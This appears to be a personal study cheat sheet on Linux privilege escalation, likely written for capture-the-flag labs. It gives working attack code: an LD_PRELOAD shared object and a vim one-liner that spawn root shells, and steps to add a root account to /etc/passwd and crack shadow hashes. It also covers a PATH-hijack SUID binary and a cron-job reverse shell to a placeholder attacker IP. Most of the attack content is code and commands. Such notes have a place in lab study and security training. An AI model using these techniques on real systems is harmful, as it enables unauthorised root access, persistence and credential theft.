# Linux Previledge Escalation

What to do here?

- Resetting passwords
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command

## 1. Linux Eneumeration

Check out my [leb-LinuxEchoBeach](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md) for eneumerating Linux System

Also, you can get some knowledge about wargames at my soloutions to overthewire [bandit](https://github.com/Yeaseen/overthewire-solve/tree/main/Bandit)

## 2. Automated Eneumeration Scripts with prospective exploitation points

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LES(Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)

Donlowad any of the script on your local machine and transfer this to the compromized VM either using [scp command](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md#copy-files-between-two-different-network-remotely) or creatimg python [simple http server](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md#in-the-same-networkhost-and-virtual-oses-file-transfer-between-two-machines-using-python-server)

## 3. Kernel Exploits for Privilege Escalation

- One way:
  Find the Linux Kernel and System versions. Go to exploit-db or dimilar websites to grab a script. Make your you have all the necessary packages installed on the device, otherwise you will just destroy the compromized system.
  You can use the following script for Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04)

  - ['overlayfs' Local Privilege Escalation](https://www.exploit-db.com/exploits/37292)
    For this, you need to have gcc installed on the system.

- Another way:
  Search if nano command is exploitable. If exploitable, press ctrl+R, ctrl+X and execute `bash reset; bash 1>&0 2>&0`
  Eventually, you should get the root access.

## 4. Sudo Vulnerability for Privilege Escalation

- Leverage application functions
  Here you have to find an application that supports loading alternative configuration file such as Apache2's -f option to specify an alternative ServerConfigFile. You can load /etc/shadow file using -f option of apache2 command, resulting in an error message that includes the first line of the /etc/shadow file.

- Leverage LD_PRELOAD

  - On some systmes, `bash sudo -l` will give you its current situation related to root privileges. Such as whether env_keep variable is enabled. If it is: env_keep+=LD_PRELOAD, that means we can create a shared library object so file to first unset the env file and load the /bash/bin or /bash/sh file.
  - LD_PRELOAD-->These capabilities often involve manipulating or intercepting function calls within programs, allowing for customization or modification of their behavior.
  - The steps of this privilege escalation vector can be summarized as follows;

    - Check for LD_PRELOAD (with the env_keep option)
    - Write a simple C code compiled as a share object (.so extension) file
    - Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

  - The following about.c code simply spawns a root shell

    ```
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
    }
    ```

  - compile it using gcc into a shared object file using the following parameters:
    `bash gcc -fPIC -shared -o about.so about.c -nostartfiles`
  - Now, we have the capability to employ this shared object file when initiating any program accessible to our user through the sudo command. In our scenario, programs like Apache2, find, or nearly any other program executable with sudo privileges can leverage this shared object file.
  - run the program by specifying the LD_PRELOAD option, resulting in a shell spawn with root previledges
    `bash sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
  - check by running `bash id`

## 5. SUID vulnerabilty for Priviledge Escalation

Linux privilege controls heavily hinge on managing the interactions between users and files, achieved through permissions. As you're aware, files can possess read, write, and execute permissions, each granted to users based on their privilege levels. However, the dynamics shift with SUID (Set-user Identification) and SGID (Set-group Identification). These mechanisms enable the execution of files with the permission level of either the file owner (SUID) or the group owner (SGID). Follow [this](https://www.scaler.com/topics/special-permissions-in-linux/) and [this](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit). `bash find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set. A good practice would be to compare executables on this list with GTFOBins [suid](https://gtfobins.github.io/#+suid)

- One way: reading the /etc/shadow file or adding our user to /etc/passwd if you can. Try to use cp command to get the /etc/passwd file to /tmp directory.

  - run `bash openssl passwd -1 salt THM passsword`
  - add the following line to etc/passwd
    <attacker_name>:<created_hash_for_passsword>:0:0:root:/root:/bin/sh

- Other way: Password Cracking using johntheripper
  - On your Kali Linux: put contents of /etc/passwd to password.txt and contents of /etc/shadow to shadow.txt
  - run `bash base64 /etc/passswd | base64 --decode` if you don't have read permission. It's one way to read the original contents of a file you don't have permission.
  - run `bash unshadow passwd.txt shadow.txt > passwords.txt`
  - get password of the current users: `bash john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt`

## 5. Capabilities Escalation

You can check any capabilities using the command `bash getcap -r / 2>/dev/null`
If the system is not updated, you should go for vim as vim is not a binary which generally needs capabilities.
If you find any binary whose capabilities are set from other user's home, then it's vulnerable.

Now, Run the following command to exploit vim: make sure to check whether it's bash or sh. This will give you root access.

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

## 6. Cron Jobs Escalation

If a scheduled task is set to run with root privileges, and we can modify the script it executes, our script will also execute with root privileges. `bash cat /etc/crontab` will give you all the scripts which are scheduled. Now find which script is running as root and you have access to that script, then modify it.

If you get anything like that, add a reverse shell attack by adding the following command in that script file. Make sure that the script has the permission to run. If not, run `bash chmod +x <script_name>`
`bash bash -i >& /dev/tcp/<ATTACKER_IP>/6666 0>&1`

## 7. Priviledge Escalation through PATH environment variable

You can find the $PATH folders using `bash echo $PATH` which will give you the folders where Linux will start searching for any command/executable files if it's not built into shell or not defined with an absolute path.
How to leverage this:

- What folders are located under $PATH
- Does your current user have write privileges for any of these folders?
- Can you modify $PATH?
- Is there a script/application you can start that will be affected by this vulnerability?

Now, write what.c file:

```#include<unistd.h>
void main(){
  setuid(0), setgid(0), system("ppp");
}
```

Now, make executables, set the SUID bit, search for writable folders under $PATH, create a binary named "what" and get the "what" script to run it. The binary will run with root priviledge as the SUID bit is set. So, it will try to execute "ppp" command from the folders under $PATH. Your task is to create the ppp script(just an echo) under any of the writable folder that can be accessible from $PATH.

```bash
gcc what.c -o what -w

#set suid bit
chmod u+s what

#check whether s bit is set or not
ls -l

#Check for setuid bit for folders
find / -perm -u=s -type f 2>/dev/null

#search for writable folders under $PATH
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
#The following will also give subfolder names and  “grep -v proc” to get rid of the many results related to running processes
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

#As usually /tmp folder is available for writing a script. and set this folder under $PATH variable.
export PATH=/tmp:$PATH
echo $PATH
cd /tmp && echo "/bin/bash" > ppp
chmod 777 ppp
ls -l ppp
cd ..

#Now go to the what binary file location and try to run that binary file
whoami
id

./what

#The following should be root
whoami
id

```

You might find that gcc isn't installed. Then you should look for a unusual folder that can be accessible. And you might find a binary file. Try to run that and follow what command it wants to execute. Then do the above part in one of the writable folders such as tmp, and run the binary file.
